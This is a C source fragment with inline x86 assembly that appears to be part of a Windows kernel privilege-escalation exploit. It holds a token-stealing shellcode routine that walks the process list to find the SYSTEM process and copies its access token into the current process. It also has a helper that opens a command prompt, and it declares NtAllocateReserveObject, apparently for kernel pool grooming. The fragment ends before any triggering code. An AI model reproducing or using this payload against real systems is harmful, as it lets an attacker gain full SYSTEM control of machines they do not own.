#include<Windows.h>

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn)
	{
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
}

__declspec(naked) VOID ShellCode()
{
	_asm
	{
		nop
		pushad
		mov eax, fs: [124h]
		mov eax, [eax + 0x50]
		mov ecx, eax
		mov edx, 4

		find_sys_pid :
		mov eax, [eax + 0xb8]
		sub eax, 0xb8
		cmp[eax + 0xb4], edx
		jnz find_sys_pid

		mov edx, [eax + 0xf8]
		mov[ecx + 0xf8], edx
		popad
		ret
	}
}

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef NTSTATUS(WINAPI* NtAllocateReserveObject_t)(OUT PHANDLE	hObject,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN DWORD              ObjectType);

NtAllocateReserveObject_t	NtAllocateReserveObject;

// 0x60
#define IO_COMPLETION_OBJECT 1